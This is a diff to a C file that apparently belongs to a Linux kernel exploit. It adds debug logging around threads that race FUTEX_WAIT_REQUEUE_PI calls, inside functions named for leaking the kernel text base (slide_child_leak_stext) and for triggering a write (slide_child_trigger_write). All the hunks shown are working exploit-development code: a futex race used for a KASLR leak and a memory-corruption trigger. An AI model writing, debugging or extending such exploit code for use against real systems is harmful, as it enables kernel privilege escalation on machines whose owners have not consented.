@@ -662,7 +662,7 @@ void *slide_waiter_thread(void *arg __attribute__((unused))) {
   errno = 0;
   long ready_ret = futex_op(&slide_f_ready, FUTEX_WAIT, 0, &timeout, NULL, 0);
   int ready_errno = errno;
-  pr_info("slide ready_futex wait ret=%ld errno=%d\n", ready_ret, ready_errno);
+  pr_info("slide DEBUG: before ready futex\n"); pr_info("slide ready_futex wait ret=%ld errno=%d\n", ready_ret, ready_errno); pr_info("slide DEBUG: after ready futex\n");
 
   /* Wait on wait_futex with requeue target */
   struct timespec wait_timeout;
@@ -678,7 +678,7 @@ void *slide_waiter_thread(void *arg __attribute__((unused))) {
   long wait_ret = futex_op(&slide_f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &wait_timeout,
                            &slide_f_pi_target, 0);
   int wait_errno = errno;
-  pr_info("slide wait_requeue_pi ret=%ld errno=%d\n", wait_ret, wait_errno);
+  pr_info("slide DEBUG: before wait requeue pi\n"); pr_info("slide wait_requeue_pi ret=%ld errno=%d\n", wait_ret, wait_errno); pr_info("slide DEBUG: after wait requeue pi\n");
   if (wait_ret != -1 || wait_errno != ETIMEDOUT) {
     atomic_store(&slide_route_done, 1);
     return NULL;
@@ -795,11 +795,11 @@ uint64_t slide_child_leak_stext(void) {
   pthread_t waiter;
   pthread_t owner;
   pthread_t consumer;
-  SYSCHK(pthread_create(&waiter, NULL, slide_waiter_thread, NULL));
-  SYSCHK(pthread_create(&owner, NULL, slide_owner_thread, NULL));
+  pr_info("slide DEBUG: creating waiter thread\n"); SYSCHK(pthread_create(&waiter, NULL, slide_waiter_thread, NULL));
+  pr_info("slide DEBUG: creating owner thread\n"); SYSCHK(pthread_create(&owner, NULL, slide_owner_thread, NULL));
   SYSCHK(pthread_create(&consumer, NULL, slide_consumer_thread, NULL));
 
-  while (!atomic_load(&slide_waiter_waiting) ||
+  pr_info("slide DEBUG: entering wait loop\n"); pr_info("slide DEBUG: waiting for threads waiter_waiting=%d owner_started=%d consumer_ready=%d\n", atomic_load(&slide_waiter_waiting), atomic_load(&slide_owner_started), atomic_load(&slide_consumer_ready)); while (!atomic_load(&slide_waiter_waiting) ||
          !atomic_load(&slide_owner_started) ||
          !atomic_load(&slide_consumer_ready)) {
     usleep(1000);
@@ -843,11 +843,11 @@ static int slide_child_trigger_write(void) {
   pthread_t waiter;
   pthread_t owner;
   pthread_t consumer;
-  SYSCHK(pthread_create(&waiter, NULL, slide_waiter_thread, NULL));
-  SYSCHK(pthread_create(&owner, NULL, slide_owner_thread, NULL));
+  pr_info("slide DEBUG: creating waiter thread\n"); SYSCHK(pthread_create(&waiter, NULL, slide_waiter_thread, NULL));
+  pr_info("slide DEBUG: creating owner thread\n"); SYSCHK(pthread_create(&owner, NULL, slide_owner_thread, NULL));
   SYSCHK(pthread_create(&consumer, NULL, slide_consumer_thread, NULL));
 
-  while (!atomic_load(&slide_waiter_waiting) ||
+  pr_info("slide DEBUG: entering wait loop\n"); pr_info("slide DEBUG: waiting for threads waiter_waiting=%d owner_started=%d consumer_ready=%d\n", atomic_load(&slide_waiter_waiting), atomic_load(&slide_owner_started), atomic_load(&slide_consumer_ready)); while (!atomic_load(&slide_waiter_waiting) ||
          !atomic_load(&slide_owner_started) ||
          !atomic_load(&slide_consumer_ready)) {
     usleep(1000);
